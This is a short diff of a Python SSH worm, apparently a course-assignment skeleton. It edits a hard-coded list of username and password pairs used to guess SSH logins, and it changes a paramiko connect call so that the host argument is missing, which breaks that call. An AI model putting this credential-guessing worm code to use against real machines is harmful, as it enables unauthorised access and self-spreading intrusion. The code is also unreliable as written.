@@ -11,12 +11,7 @@ from scapy.all import *
 
 # The list of credentials to attempt
 credList = [
-('hello', 'world'),
-('hello1', 'world'),
-('root', '#Gig#'),
-('cpsc', 'cpsc'),
-('ubuntu', '123456'),
-('victim', 'victim')
+	('victim', 'victim')
 ]
 
 # The file marking whether the worm should spread
@@ -153,7 +148,7 @@ def tryCredentials(host, userName, _password, sshClient):
 	# declaration (if you choose to use
 	# this skeleton).
 	try:
-		sshClient.connect(host, username=userName, password=_password)
+		sshClient.connect(username=userName, password=_password)
 		return 0
 	except paramiko.ssh_exception.AuthenticationException:
 		return 1
